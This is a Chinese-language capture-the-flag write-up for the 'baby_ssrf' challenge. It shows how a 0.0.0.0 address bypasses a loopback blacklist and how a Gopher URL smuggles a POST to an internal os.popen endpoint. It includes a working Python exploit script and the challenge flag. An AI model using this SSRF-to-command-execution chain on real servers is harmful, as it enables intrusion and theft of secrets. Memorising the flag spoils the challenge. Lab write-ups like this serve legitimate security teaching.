# baby_ssrf

## 题目简述

`/visit` 会让服务器使用 curl 访问任意 URL，但只禁止 `file` 协议和解析结果等于 `127.0.0.1` 的主机；内部 `/cmd` 仅接受来源地址为 `127.0.0.1` 的 POST 请求，并把 `cmd` 交给 `os.popen()`。可以用 `0.0.0.0` 绕过黑名单，再通过 Gopher 协议向本机 8000 端口发送原始 HTTP POST。

## 解题过程

关键逻辑如下：

```python
real_ip = socket.gethostbyname(url.hostname)
if url.scheme == "file" or real_ip in ["127.0.0.1"]:
    return "Hacker!"
subprocess.run(["curl", "-L", urlunparse(url)], ...)
```

`socket.gethostbyname("0.0.0.0")` 的结果仍是 `0.0.0.0`，不会命中黑名单；curl 连接本机的 `0.0.0.0:8000` 时，请求在 Flask 中表现为来自回环地址，从而通过 `/cmd` 的 `request.remote_addr == "127.0.0.1"` 检查。

内部请求使用 `env` 输出 Docker 环境变量，表单正文 `cmd=env` 长度为 7：

```http
POST /cmd HTTP/1.1
Host: 0.0.0.0:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close

cmd=env
```

下面的标准库脚本先编码 Gopher 数据，再把整个 Gopher URL 编码为外层 `url` 参数；这正是常说的“两次 URL 编码”：

```python
from urllib.parse import quote
from urllib.request import urlopen

raw = (
    "POST /cmd HTTP/1.1\r\n"
    "Host: 0.0.0.0:8000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 7\r\n"
    "Connection: close\r\n"
    "\r\n"
    "cmd=env"
)

gopher = "gopher://0.0.0.0:8000/_" + quote(raw, safe="")
outer = "http://TARGET/visit?url=" + quote(gopher, safe="")
print(urlopen(outer).read().decode())
```

`/visit` 返回 curl 收到的完整 HTTP 响应，其中环境变量包含：

```text
flag=0xGame{GOPHER_PROTOCOL_HAS_MAGIC!}
```

因此 flag 为：

```text
0xGame{GOPHER_PROTOCOL_HAS_MAGIC!}
```

## 方法总结

利用链为“地址表示绕过 → Gopher 构造原始 POST → 本机来源校验通过 → `os.popen` 命令执行”。构造时要区分 Gopher 负载编码和外层查询参数编码，并确保 `Content-Length` 与正文完全一致。
